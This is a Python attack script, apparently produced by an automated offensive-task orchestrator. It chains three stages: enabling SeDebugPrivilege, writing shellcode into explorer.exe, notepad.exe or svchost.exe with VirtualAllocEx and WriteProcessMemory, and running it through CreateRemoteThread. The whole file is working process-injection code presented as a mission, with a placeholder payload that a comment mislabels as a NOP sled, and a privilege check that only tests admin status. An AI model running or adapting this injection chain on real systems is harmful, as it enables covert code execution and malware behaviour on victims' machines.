#!/usr/bin/env python3
import sys
import json
import time
from typing import Dict, Any
import ctypes
import psutil
import win32security

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    has_debug = False

    try:
        # Attempt to acquire SeDebugPrivilege
        hToken = win32security.OpenProcessToken(
            win32security.GetCurrentProcess(),
            win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
        )
        privilege_id = win32security.LookupPrivilegeValue(None, "SeDebugPrivilege")
        win32security.AdjustTokenPrivileges(
            hToken,
            False,
            [(privilege_id, win32security.SE_PRIVILEGE_ENABLED)]
        )
        
        # Check if the privilege was successfully enabled
        has_debug = ctypes.windll.shell32.IsUserAnAdmin() != 0

        result = {'has_debug': has_debug}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        # Fallback: check if the user is an admin
        try:
            has_debug = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception as fallback_exception:
            has_debug = False

        result = {'has_debug': has_debug}
        return {'success': False, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    PROCESS_ALL_ACCESS = 0x1F0FFF
    result = {'remote_addr': None, 'success': False}

    try:
        has_debug = input_data.get('has_debug', False)

        if not has_debug:
            return {'success': False, 'data': result,
                    'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

        # Find target process: explorer.exe → notepad.exe → svchost.exe
        target_pid = None
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] in ['explorer.exe', 'notepad.exe', 'svchost.exe']:
                target_pid = proc.pid
                break

        if target_pid is None:
            # Fallback: GetCurrentProcess()
            target_pid = psutil.Process().pid
            result['success'] = False

        # Open the target process
        kernel32 = ctypes.windll.kernel32
        process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)

        if not process_handle:
            return {'success': False, 'data': result,
                    'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

        # Allocate memory in the target process
        shellcode = bytes.fromhex("fc4883e4f0")  # NOP sled as placeholder shellcode
        shellcode_size = len(shellcode)
        remote_addr = kernel32.VirtualAllocEx(process_handle, 0, shellcode_size,
                                              0x3000, 0x40)  # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE

        if not remote_addr:
            return {'success': False, 'data': result,
                    'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

        # Write shellcode to the allocated memory
        bytes_written = ctypes.c_size_t(0)
        write_success = kernel32.WriteProcessMemory(process_handle, remote_addr,
                                                    shellcode, shellcode_size,
                                                    ctypes.byref(bytes_written))

        if not write_success or bytes_written.value != shellcode_size:
            return {'success': False, 'data': result,
                    'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

        # Close the process handle
        kernel32.CloseHandle(process_handle)

        # Update result
        result['remote_addr'] = remote_addr
        result['success'] = True

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    PROCESS_ALL_ACCESS = 0x1F0FFF
    result = {'thread_id': None, 'running': False}

    try:
        remote_addr = input_data.get('remote_addr')
        injection_success = input_data.get('success', False)

        if not injection_success:
            return {'success': False, 'data': result,
                    'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

        # Attempt to find a target process
        target_pid = None
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] in ['explorer.exe', 'notepad.exe', 'svchost.exe']:
                target_pid = proc.pid
                break

        if target_pid is None:
            # Fallback to current process if no target found
            target_pid = psutil.Process().pid
            injection_success = False

        # Open the target process
        kernel32 = ctypes.windll.kernel32
        process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)

        if not process_handle:
            return {'success': False, 'data': result,
                    'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

        # Create a remote thread in the target process
        thread_id = ctypes.c_ulong(0)
        if remote_addr is not None:
            thread_handle = kernel32.CreateRemoteThread(
                process_handle,
                None,
                0,
                ctypes.c_void_p(remote_addr),
                None,
                0,
                ctypes.byref(thread_id)
            )

            if thread_handle:
                result['thread_id'] = thread_id.value
                result['running'] = True
                kernel32.CloseHandle(thread_handle)

        kernel32.CloseHandle(process_handle)

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Acquire Debug Privileges [privilege-escalation] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Acquire Debug Privileges): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Acquire Debug Privileges): FAILED — {err}')
            failed.append('T1')
            print('[!] abort_mission — stopping')
            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    
    # ── T2: Inject Shellcode [execution] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Inject Shellcode): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Inject Shellcode): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Execute Injected Code [execution] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Execute Injected Code): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Execute Injected Code): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))